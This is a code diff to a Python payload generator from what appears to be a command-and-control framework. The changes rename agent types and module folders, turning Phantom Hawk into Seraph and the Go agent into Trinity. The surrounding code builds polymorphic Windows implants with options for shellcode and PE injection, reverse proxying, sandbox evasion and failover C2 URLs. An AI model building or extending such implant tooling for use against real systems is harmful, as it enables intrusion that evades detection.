@@ -176,22 +176,22 @@ class PayloadGenerator:
         # Extract failover URLs from profile_config if use_failover is enabled
         failover_urls = profile_config.get('failover_urls', []) if use_failover else []
 
-        # Extract headers from profile for Go agent
-        profile_headers = profile_config.get('headers', {'User-Agent': 'Go C2 Agent'})
+        # Extract headers from profile for Trinity agent
+        profile_headers = profile_config.get('headers', {'User-Agent': 'Trinity C2 Agent'})
 
         print(f"[+] Generating polymorphic variant")
-        if payload_type == "phantom_hawk_agent":
-            return self._generate_phantom_hawk_agent(
+        if payload_type == "seraph":
+            return self._generate_seraph(
                 agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls
             )
-        elif payload_type == "go_agent":
+        elif payload_type == "trinity":
             return self._generate_go_agent(
                 agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox
             )
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
 
-    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
+    def _generate_seraph(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
         if failover_urls is None:
             failover_urls = []
         if working_hours is None:
@@ -343,7 +343,7 @@ class PayloadGenerator:
         listener_id_for_registration = 'web_app_default'
 
 
-        template_path = os.path.join(os.path.dirname(__file__), 'phantom_hawk_template.py')
+        template_path = os.path.join(os.path.dirname(__file__), 'seraph_template.py')
         with open(template_path, 'r') as f:
             agent_template = f.read()
 
@@ -452,7 +452,7 @@ class PayloadGenerator:
             m_relay_data=m_relay_data
         )
 
-        print(f"[+] POLYMORPHIC Phantom Hawk agent generated (Class: {class_name})")
+        print(f"[+] POLYMORPHIC Seraph agent generated (Class: {class_name})")
         return agent_template.strip()
 
 
@@ -460,7 +460,7 @@ class PayloadGenerator:
         if failover_urls is None:
             failover_urls = []
         if profile_headers is None:
-            profile_headers = {'User-Agent': 'Go C2 Agent'}
+            profile_headers = {'User-Agent': 'Trinity C2 Agent'}
         import subprocess
         import os
         import tempfile
@@ -468,7 +468,7 @@ class PayloadGenerator:
         from datetime import datetime
         import random
 
-        # Create a polymorphic engine instance for Go agent
+        # Create a polymorphic engine instance for Trinity agent
         poly = PolymorphicEngine()
 
         # Generate random names for struct types and fields
@@ -578,11 +578,11 @@ class PayloadGenerator:
         agent_last_connection_attempt_field = poly.generate_go_field_name('LastConnectionAttempt')
         agent_in_failover_attempt_field = poly.generate_go_field_name('InFailoverAttempt')
 
-        # Build the Go agent by combining core and selected feature modules
+        # Build the Trinity agent by combining core and selected feature modules
         go_code_parts = []
 
         # Build the package declaration with conditional imports
-        core_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'core')
+        core_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'core')
 
         # Start with the package declaration
         package_file = os.path.join(core_dir, 'package_declaration.go')
@@ -683,7 +683,7 @@ class PayloadGenerator:
 
         # Conditionally add feature modules
         if include_bof:
-            bof_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'bof')
+            bof_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'bof')
             for filename in os.listdir(bof_dir):
                 if filename.endswith('.go'):
                     with open(os.path.join(bof_dir, filename), 'r') as f:
@@ -717,7 +717,7 @@ class PayloadGenerator:
                         go_code_parts.append('\n'.join(filtered_lines))
 
         if include_assembly:
-            assembly_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'assembly')
+            assembly_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'assembly')
             for filename in os.listdir(assembly_dir):
                 if filename.endswith('.go'):
                     with open(os.path.join(assembly_dir, filename), 'r') as f:
@@ -751,7 +751,7 @@ class PayloadGenerator:
                         go_code_parts.append('\n'.join(filtered_lines))
 
         if include_shellcode or include_pe:  # Both need the same Windows structures
-            shellcode_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'shellcode')
+            shellcode_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'shellcode')
             for filename in os.listdir(shellcode_dir):
                 if filename.endswith('.go'):
                     with open(os.path.join(shellcode_dir, filename), 'r') as f:
@@ -785,7 +785,7 @@ class PayloadGenerator:
                         go_code_parts.append('\n'.join(filtered_lines))
 
         if include_pe:
-            pe_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'pe')
+            pe_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'pe')
             for filename in os.listdir(pe_dir):
                 if filename.endswith('.go'):
                     with open(os.path.join(pe_dir, filename), 'r') as f:
@@ -819,7 +819,7 @@ class PayloadGenerator:
                         go_code_parts.append('\n'.join(filtered_lines))
 
         if include_reverse_proxy:
-            reverse_proxy_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'reverse_proxy')
+            reverse_proxy_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'reverse_proxy')
             for filename in os.listdir(reverse_proxy_dir):
                 if filename.endswith('.go'):
                     with open(os.path.join(reverse_proxy_dir, filename), 'r') as f:
@@ -853,7 +853,7 @@ class PayloadGenerator:
                         go_code_parts.append('\n'.join(filtered_lines))
 
         if include_sandbox:
-            sandbox_dir = os.path.join(os.path.dirname(__file__), 'go_modules', 'sandbox')
+            sandbox_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'sandbox')
             for filename in os.listdir(sandbox_dir):
                 if filename.endswith('.go'):
                     with open(os.path.join(sandbox_dir, filename), 'r') as f:
@@ -1039,7 +1039,7 @@ class PayloadGenerator:
         go_headers_literal = "{" + ", ".join(go_headers_parts) + "}"
 
         # Replace the hardcoded headers in the struct initialization to Opsec Safe profile_config header
-        go_code = go_code.replace('map[string]string{"User-Agent": "Go C2 Agent"}', f"map[string]string{go_headers_literal}")
+        go_code = go_code.replace('map[string]string{"User-Agent": "Trinity C2 Agent"}', f"map[string]string{go_headers_literal}")
 
         # Extract endpoints from profile_config to replace hardcoded defaults
         endpoints = profile_config.get('endpoints', {})
@@ -1097,8 +1097,8 @@ class PayloadGenerator:
             os.makedirs(logs_dir)
 
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        safe_listener_name = "go_agent"  # We'll use a generic name since we don't have listener_name here
-        exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}.exe"
+        safe_listener_name = "trinity"  # We'll use a generic name since we don't have listener_name here
+        exe_filename = f"trinity_{agent_id[:8]}_{timestamp}.exe"
         final_exe_path = os.path.join(logs_dir, exe_filename)
 
         with tempfile.TemporaryDirectory() as temp_dir:
@@ -1177,11 +1177,11 @@ class PayloadGenerator:
 
                 shutil.move(temp_exe_path, final_exe_path)
 
-                print(f"[+] Polymorphic Go agent compiled successfully to: {final_exe_path}")
+                print(f"[+] Polymorphic Trinity agent compiled successfully to: {final_exe_path}")
 
                 return final_exe_path
 
             except subprocess.CalledProcessError as e:
-                raise Exception(f"Failed to compile Go agent: {str(e)}")
+                raise Exception(f"Failed to compile Trinity agent: {str(e)}")
             except FileNotFoundError:
                 raise Exception("Go compiler not found. Please install Go and ensure 'go' command is in PATH.") # See documentation
